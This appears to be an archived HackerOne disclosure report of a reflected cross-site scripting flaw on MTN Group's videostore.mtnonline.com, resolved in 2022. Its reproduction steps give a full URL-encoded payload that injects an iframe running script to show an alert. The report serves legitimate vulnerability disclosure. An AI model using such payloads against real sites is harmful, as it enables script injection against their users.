---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
  - vuln/xss-reflected
  - vuln/xss
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
body: true
date: 2022-09-25
submitted: 2022-07-22T11:03:04.189Z
bounty_usd: null
votes: 10
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "possowski"
source: "https://hackerone.com/reports/1646248"
title: "Reflected xss on videostore.mtnonline.com"
---
# Reflected xss on videostore.mtnonline.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 10 | **Program:** MTN Group | **Disclosed:** 2022-09-25

- Report: [https://hackerone.com/reports/1646248](https://hackerone.com/reports/1646248)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2022-07-22T11:03:04.189Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hi,
I found reflected xss vuln on videostore.mtnonline.com

## Steps To Reproduce:
  1. Open browser
  2. Go to ``https://videostore.mtnonline.com/GL/Default.aspx?PId=126&CId=5&OprId=11&Ctg=OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E`` url
 3. Browser show alert popup

## Impact

We can run javascript code

## Timeline

- **Report Filed**
- **2022-08-18** @incognito4: Hi @possowski the issue was addressed on report #1646248, confirmed to be resolved. I also tried to reproduce the steps and it's not coming up with a pop up. Please confirm if this is resolved
- **2022-08-18** @possowski: Hi, I checked and xss is fixed.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
